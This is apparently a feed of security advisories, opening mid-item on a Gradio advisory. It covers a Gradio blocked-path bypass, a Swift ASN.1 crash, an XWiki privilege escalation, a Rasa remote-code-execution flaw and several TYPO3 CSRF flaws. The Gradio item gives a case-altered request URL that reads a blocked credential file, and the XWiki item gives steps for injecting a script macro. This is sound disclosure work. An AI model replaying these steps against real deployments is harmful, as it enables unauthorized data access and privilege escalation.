    if in_blocklist:
        return False, &quot;in_blocklist&quot;
    if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):
        return True, &quot;allowed&quot;
    if any(is_in_or_equal(path, created_path) for created_path in created_paths):
        return True, &quot;created&quot;
    return False, &quot;not_created_or_allowed&quot;
```

Gradio relies on `is_in_or_equal` to determine if a file path is restricted. However, this logic fails to handle case variations in paths on case-insensitive file systems, leading to the bypass.

## Proof of Concept (PoC)

### Steps to Reproduce

- Deploy a Gradio demo app on a case-insensitive operating system (e.g., Windows or macOS).

  ```bash
  import gradio as gr
  def update(name):
      return f&quot;Welcome to Gradio, {name}!&quot;
  
  with gr.Blocks() as demo:
      gr.Markdown(&quot;Start typing below and then click **Run** to see the output.&quot;)
      with gr.Row():
          inp = gr.Textbox(placeholder=&quot;What is your name?&quot;)
          out = gr.Textbox()
      btn = gr.Button(&quot;Run&quot;)
      btn.click(fn=update, inputs=inp, outputs=out)
  
  demo.launch(blocked_paths=[&#x27;resources&#x2F;admin&#x27;], allowed_paths=[&#x27;resources&#x2F;&#x27;])
  ```

- Set up the file system:

  - Create a folder named `resources` in the same directory as the app, containing a file `1.txt`.

  - Inside the `resources` folder, create a subfolder named `admin` containing a sensitive file `credential.txt` (this file should be inaccessible due to `blocked_paths`).

- Perform the attack:

  - Access the sensitive file using a case-altered path:

    ```
    http:&#x2F;&#x2F;127.0.0.1:PORT&#x2F;gradio_api&#x2F;file=resources&#x2F;adMin&#x2F;credential.txt
    ```

### Expected Result

Access to `resources&#x2F;admin&#x2F;credential.txt` should be blocked.

### Actual Result

By altering the case in the path (e.g., `adMin`), the blocked ACL is bypassed, and unauthorized access to the sensitive file is granted.

![image-20241119172439042](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2024&#x2F;11&#x2F;19&#x2F;17-24-39-883969d4c31ce8a8d2a939654fab56d4.png)

This demonstration highlights that flipping the case of restricted paths allows attackers to bypass Gradio&#x27;s ACL and access sensitive data.

## Remediation Recommendations

1. **Normalize Path Case**:

   - Before evaluating paths against the ACL, normalize the case of both the requested path and the blocked paths (e.g., convert all paths to lowercase).

   - Example:

     ```python
     normalized_path = str(path).lower()
     normalized_blocked_paths = [str(p).lower() for p in blocked_paths]
     ```

2. **Update Documentation**:

   - Warn developers about potential risks when deploying Gradio on case-insensitive file systems.

3. **Release Security Patches**:

   - Notify users of the vulnerability and release an updated version of Gradio with the fixed logic.

## 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w8xv-rwgf-4fwh: 0 | <b>CVE-2025-0343: Swift ASN.1 can crash when parsing maliciously formed BER&#x2F;DER</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w8xv-rwgf-4fwh</link>
                    <pubDate>2025-01-14T16:32:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w8xv-rwgf-4fwh'>https://osv.dev/vulnerability/GHSA-w8xv-rwgf-4fwh</a><br>
                            <b>Published:</b> 2025-01-14T16:32:07Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/apple/swift-asn1/security/advisories/GHSA-w8xv-rwgf-4fwh'>https://github.com/apple/swift-asn1/security/advisories/GHSA-w8xv-rwgf-4fwh</a></li><li>- <a target='_blank' href='https://github.com/apple/swift-asn1/commit/ae33e5941bb88d88538d0a6b19ca0b01e6c76dcf'>https://github.com/apple/swift-asn1/commit/ae33e5941bb88d88538d0a6b19ca0b01e6c76dcf</a></li><li>- <a target='_blank' href='https://github.com/apple/swift-asn1'>https://github.com/apple/swift-asn1</a></li></ul><br>
                            <b>Details:</b> <b>CVE-2025-0343: Swift ASN.1 can crash when parsing maliciously formed BER&#x2F;DER</b><br>Swift ASN.1 can be caused to crash when parsing certain BER&#x2F;DER constructions. This crash is caused by a confusion in the ASN.1 library itself which assumes that certain objects can only be provided in either constructed or primitive forms, and will trigger a `preconditionFailure` if that constraint isn&#x27;t met.

Importantly, these constraints are actually required to be true in DER, but that correctness wasn&#x27;t enforced on the early node parser side so it was incorrect to rely on it later on in decoding, which is what the library did.

These crashes can be triggered when parsing any DER&#x2F;BER format object. There is no memory-safety issue here: the crash is a graceful one from the Swift runtime. The impact of this is that it can be used as a denial-of-service vector when parsing BER&#x2F;DER data from unknown sources, e.g. when parsing TLS certificates.

Many thanks to @baarde for reporting this issue and providing the fix.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-rmm7-r7wr-xpfg: 9.0 | <b>XWiki Realtime WYSIWYG Editor extension allows privilege escalation (PR) through realtime WYSIWYG editing</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-rmm7-r7wr-xpfg</link>
                    <pubDate>2025-01-14T16:00:36Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-rmm7-r7wr-xpfg'>https://osv.dev/vulnerability/GHSA-rmm7-r7wr-xpfg</a><br>
                            <b>Published:</b> 2025-01-14T16:00:36Z<br>
                            <b>Severity:</b> 9.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rmm7-r7wr-xpfg'>https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rmm7-r7wr-xpfg</a></li><li>- <a target='_blank' href='https://extensions.xwiki.org/xwiki/bin/view/Extension/CKEditor+Integration#HAdministrationSection'>https://extensions.xwiki.org/xwiki/bin/view/Extension/CKEditor+Integration#HAdministrationSection</a></li><li>- <a target='_blank' href='https://extensions.xwiki.org/xwiki/bin/view/Extension/Realtime%20WYSIWYG%20Editor'>https://extensions.xwiki.org/xwiki/bin/view/Extension/Realtime%20WYSIWYG%20Editor</a></li><li>- <a target='_blank' href='https://github.com/xwiki/xwiki-platform'>https://github.com/xwiki/xwiki-platform</a></li><li>- <a target='_blank' href='https://jira.xwiki.org/browse/XWIKI-21949'>https://jira.xwiki.org/browse/XWIKI-21949</a></li></ul><br>
                            <b>Details:</b> <b>XWiki Realtime WYSIWYG Editor extension allows privilege escalation (PR) through realtime WYSIWYG editing</b><br>### Impact

NOTE: The [Realtime WYSIWYG Editor](https:&#x2F;&#x2F;extensions.xwiki.org&#x2F;xwiki&#x2F;bin&#x2F;view&#x2F;Extension&#x2F;Realtime%20WYSIWYG%20Editor&#x2F;) extension was **experimental**, and thus **not recommended**, in the versions affected by this vulnerability. It has become enabled by default, and thus recommended, starting with XWiki 16.9.0.

A user with only **edit right** can join a realtime editing session where others, that where already there or that may join later, have **script** or **programming** access rights. This user can then insert **script rendering macros** that are executed for those users in the realtime session that have script or programming rights. The inserted scripts can be used to gain more access rights.

Here&#x27;s an example that works with XWiki 15.10.9+ and 16.2.0+:

* the attacker starts editing a wiki page in realtime (for which they have edit right)
* another user, with script or programming access right joins the editing session (e.g. by clicking on a link &#x2F; URL provided by the attacker)
* the attacker inserts a script rendering macro, say ``{{velocity}}I can run scripts{{&#x2F;velocity}}``, in the edited content, using the WYSIWYG editor UI
* the edited content is reloaded for both the attacker and the other user, in order to render the inserted macro
  * the attacker gets a rendering error message
  * the other user sees &quot;I can run scripts&quot;

The attacker can obviously use more advanced scripts to gain access rights.

Before XWiki 15.10.9 and 16.2.0 the edited content was not re-rendered for all the users in the editing sesesion, but only for the user that inserted the macro. This means that in order to reproduce the problem the other user had to insert or update a macro or save and view the content.

### Patches

This vulnerability has been patched in XWiki 15.10.12, 16.4.1 and 16.6.0-rc-1.

### Workarounds

To avoid this vulnerability you can:

* either disable the realtime WYSIWYG editing by disabling the ``xwiki-realtime`` CKEditor plugin from [the WYSIWYG editor administration section](https:&#x2F;&#x2F;extensions.xwiki.org&#x2F;xwiki&#x2F;bin&#x2F;view&#x2F;Extension&#x2F;CKEditor+Integration#HAdministrationSection)
* or uninstall the [Realtime WYSIWYG Editor](https:&#x2F;&#x2F;extensions.xwiki.org&#x2F;xwiki&#x2F;bin&#x2F;view&#x2F;Extension&#x2F;Realtime%20WYSIWYG%20Editor&#x2F;) extension (org.xwiki.platform:xwiki-platform-realtime-wysiwyg-ui)

### References

* https:&#x2F;&#x2F;jira.xwiki.org&#x2F;browse&#x2F;XWIKI-21949

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Jira XWiki.org](https:&#x2F;&#x2F;jira.xwiki.org&#x2F;)
* Email us at [Security Mailing List](mailto:security@xwiki.org)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cpv4-ggrr-7j9v: 9.0 | <b>Rasa Allows Remote Code Execution via Remote Model Loading</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cpv4-ggrr-7j9v</link>
                    <pubDate>2025-01-14T16:00:21Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cpv4-ggrr-7j9v'>https://osv.dev/vulnerability/GHSA-cpv4-ggrr-7j9v</a><br>
                            <b>Published:</b> 2025-01-14T16:00:21Z<br>
                            <b>Severity:</b> 9.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-cpv4-ggrr-7j9v'>https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-cpv4-ggrr-7j9v</a></li><li>- <a target='_blank' href='https://github.com/RasaHQ/rasa/commit/2bb1d779d4f4acaf70b6dfa35dd1899dccbb1ae6'>https://github.com/RasaHQ/rasa/commit/2bb1d779d4f4acaf70b6dfa35dd1899dccbb1ae6</a></li><li>- <a target='_blank' href='https://github.com/rasahq/rasa'>https://github.com/rasahq/rasa</a></li></ul><br>
                            <b>Details:</b> <b>Rasa Allows Remote Code Execution via Remote Model Loading</b><br>## Vulnerability
A vulnerability has been identified in Rasa Pro and Rasa Open Source that enables an attacker who has the ability to load a maliciously crafted model remotely into a Rasa instance to achieve Remote Code Execution.

The prerequisites for this are:
- The HTTP API must be enabled on the Rasa instance eg with `--enable-api`. This is not the default configuration.
- For unauthenticated RCE to be exploitable, the user must not have configured any authentication or other security controls recommended in our documentation.
- For authenticated RCE, the attacker must posses a valid authentication token or JWT to interact with the Rasa API.

## Fix
We encourage you to upgrade to a version of Rasa that includes a fix. These are:

- Rasa Pro 3.8.18, 3.9.16, 3.10.12
- Rasa Open Source 3.6.21

Once you have upgraded your Rasa Pro or Open Source installation, you will need to retrain your model using the fixed version of Rasa Pro or Open Source. If you have a custom component that inherits from one of the components listed below and modified the persist or load method, make sure to update your code. Please contact us in case you encounter any problems.

Affected components:

- `CountVectorFeaturizer`
- `LexicalSyntacticFeaturizer`
- `LogisticRegressionClassifier`
- `SklearnIntentClassifier`
- `DIETClassifier`
- `CRFEntityExtractor`
- `TrackerFeaturizer`
- `TEDPolicy`
- `UnexpectedIntentTEDPolicy`

If you are unable to upgrade immediately, please follow our mitigation advice below.

## Mitigation Advice

- The unauthenticated RCE can be mitigated by ensuring that you enable authentication for the Rasa HTTP API if this is enabled. This means that in addition to passing `--enable-api` to Rasa, you should also pass an authentication configuration as described in our documentation [here](https:&#x2F;&#x2F;rasa.com&#x2F;docs&#x2F;rasa-pro&#x2F;production&#x2F;rest-api&#x2F;#enabling-the-rest-api). 

- The authenticated RCE can be mitigated by:
    - Ensuring that you only load models from trusted sources such as your own CI pipelines. You can check file hashes for model archives to confirm that a model has not been tampered with between training and use.
    - Confirming that you have sufficient access controls and utilize the principle of least privilege to control who in your organization has the ability to interact with the Rasa API even with authentication enabled.

## Future Releases
As an additional security step, a future release of Rasa Pro will remove the ability to enable the API without any authentication method enabled.

## Credit
Rasa would like to thank Julian Scheid from Deutsche Telekom Security GmbH for responsible disclosure of this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8mv3-37rc-pvxj: 4.3 | <b>TYPO3 DB Check Module vulnerable to Cross-Site Request Forgery</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8mv3-37rc-pvxj</link>
                    <pubDate>2025-01-14T15:42:50Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8mv3-37rc-pvxj'>https://osv.dev/vulnerability/GHSA-8mv3-37rc-pvxj</a><br>
                            <b>Published:</b> 2025-01-14T15:42:50Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-8mv3-37rc-pvxj'>https://github.com/TYPO3/typo3/security/advisories/GHSA-8mv3-37rc-pvxj</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/lowlevel'>https://github.com/TYPO3-CMS/lowlevel</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-010'>https://typo3.org/security/advisory/typo3-core-sa-2025-010</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 DB Check Module vulnerable to Cross-Site Request Forgery</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “DB Check Module” allows attackers to manipulate data through unauthorized actions.

### Solution
Update to TYPO3 versions 11.5.42 ELTS that fixes the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-010](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-010)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7835-fcv3-g256: 8.0 | <b>TYPO3 Scheduler Module vulnerable to Cross-Site Request Forgery</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7835-fcv3-g256</link>
                    <pubDate>2025-01-14T15:42:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7835-fcv3-g256'>https://osv.dev/vulnerability/GHSA-7835-fcv3-g256</a><br>
                            <b>Published:</b> 2025-01-14T15:42:12Z<br>
                            <b>Severity:</b> 8.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-7835-fcv3-g256'>https://github.com/TYPO3/typo3/security/advisories/GHSA-7835-fcv3-g256</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/scheduler'>https://github.com/TYPO3-CMS/scheduler</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-009'>https://typo3.org/security/advisory/typo3-core-sa-2025-009</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Scheduler Module vulnerable to Cross-Site Request Forgery</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Scheduler Module” allows attackers to trigger pre-defined command classes - which can lead to unauthorized import or export of data in the worst case.

### Solution
Update to TYPO3 versions 11.5.42 ELTS that fixes the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-009](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-009)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7r5q-4qgx-v545: 4.3 | <b>TYPO3 Indexed Search Module vulnerable to Cross-Site Request Forgery</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7r5q-4qgx-v545</link>
                    <pubDate>2025-01-14T15:40:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7r5q-4qgx-v545'>https://osv.dev/vulnerability/GHSA-7r5q-4qgx-v545</a><br>
                            <b>Published:</b> 2025-01-14T15:40:59Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-7r5q-4qgx-v545'>https://github.com/TYPO3/typo3/security/advisories/GHSA-7r5q-4qgx-v545</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/indexed_search/commit/cfda3f1edeea3c50034bce5c25393e297408c2b4'>https://github.com/TYPO3-CMS/indexed_search/commit/cfda3f1edeea3c50034bce5c25393e297408c2b4</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/indexed_search'>https://github.com/TYPO3-CMS/indexed_search</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-008'>https://typo3.org/security/advisory/typo3-core-sa-2025-008</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Indexed Search Module vulnerable to Cross-Site Request Forgery</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Indexed Search Module” allows attackers to delete items of the component.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-008](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-008)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-ww7h-g2qf-7xv6: 5.4 | <b>TYPO3 Form Framework Module vulnerable to Cross-Site Request Forgery</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-ww7h-g2qf-7xv6</link>
                    <pubDate>2025-01-14T15:40:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-ww7h-g2qf-7xv6'>https://osv.dev/vulnerability/GHSA-ww7h-g2qf-7xv6</a><br>
                            <b>Published:</b> 2025-01-14T15:40:37Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-ww7h-g2qf-7xv6'>https://github.com/TYPO3/typo3/security/advisories/GHSA-ww7h-g2qf-7xv6</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/form/commit/93327743f5dfd31c44898ce16e3e004e05f8ba5f'>https://github.com/TYPO3-CMS/form/commit/93327743f5dfd31c44898ce16e3e004e05f8ba5f</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/form'>https://github.com/TYPO3-CMS/form</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-007'>https://typo3.org/security/advisory/typo3-core-sa-2025-007</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Form Framework Module vulnerable to Cross-Site Request Forgery</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Form Framework Module” allows attackers to manipulate or delete persisted form definitions.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-007](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-007)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4g52-pq8j-6qv5: 7.5 | <b>TYPO3 Extension Manager Module vulnerable to Cross-Site Request Forgery</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4g52-pq8j-6qv5</link>
                    <pubDate>2025-01-14T15:40:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4g52-pq8j-6qv5'>https://osv.dev/vulnerability/GHSA-4g52-pq8j-6qv5</a><br>
                            <b>Published:</b> 2025-01-14T15:40:07Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-4g52-pq8j-6qv5'>https://github.com/TYPO3/typo3/security/advisories/GHSA-4g52-pq8j-6qv5</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/extensionmanager/commit/a5a58626dcb2af0c31bc6aec068e3d24e789b9e8'>https://github.com/TYPO3-CMS/extensionmanager/commit/a5a58626dcb2af0c31bc6aec068e3d24e789b9e8</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/extensionmanager'>https://github.com/TYPO3-CMS/extensionmanager</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-006'>https://typo3.org/security/advisory/typo3-core-sa-2025-006</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Extension Manager Module vulnerable to Cross-Site Request Forgery</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Extension Manager Module” allows attackers to retrieve and install 3rd party extensions from the TYPO3 Extension Repository - which can lead to remote code execution in the worst case.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-006](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-006)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qwx7-39pw-2mhr: 4.3 | <b>TYPO3 Cross-Site Request Forgery in Dashboard Module</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qwx7-39pw-2mhr</link>
                    <pubDate>2025-01-14T15:25:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qwx7-39pw-2mhr'>https://osv.dev/vulnerability/GHSA-qwx7-39pw-2mhr</a><br>
                            <b>Published:</b> 2025-01-14T15:25:45Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-qwx7-39pw-2mhr'>https://github.com/TYPO3/typo3/security/advisories/GHSA-qwx7-39pw-2mhr</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/dashboard/commit/c2e5dbdda87387ad9ee2ff8ca986d41dd9424875'>https://github.com/TYPO3-CMS/dashboard/commit/c2e5dbdda87387ad9ee2ff8ca986d41dd9424875</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/dashboard'>https://github.com/TYPO3-CMS/dashboard</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-005'>https://typo3.org/security/advisory/typo3-core-sa-2025-005</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Cross-Site Request Forgery in Dashboard Module</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Dashboard Module” allows attackers to manipulate the victim’s dashboard configuration.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-005](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-005)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6w4x-gcx3-8p7v: 4.3 | <b>TYPO3 Cross-Site Request Forgery in Backend User Module</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6w4x-gcx3-8p7v</link>
                    <pubDate>2025-01-14T15:25:04Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6w4x-gcx3-8p7v'>https://osv.dev/vulnerability/GHSA-6w4x-gcx3-8p7v</a><br>
                            <b>Published:</b> 2025-01-14T15:25:04Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-6w4x-gcx3-8p7v'>https://github.com/TYPO3/typo3/security/advisories/GHSA-6w4x-gcx3-8p7v</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/beuser/commit/1bb317cb2bc0b2f6ba4f758a088f060b36c67f9d'>https://github.com/TYPO3-CMS/beuser/commit/1bb317cb2bc0b2f6ba4f758a088f060b36c67f9d</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/beuser'>https://github.com/TYPO3-CMS/beuser</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-004'>https://typo3.org/security/advisory/typo3-core-sa-2025-004</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Cross-Site Request Forgery in Backend User Module</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Backend User Module” allows attackers to initiate password resets for other backend users or to terminate their user sessions.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-004](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-004)

                        ]]>
                    </description>
                </item>
            
                <item>
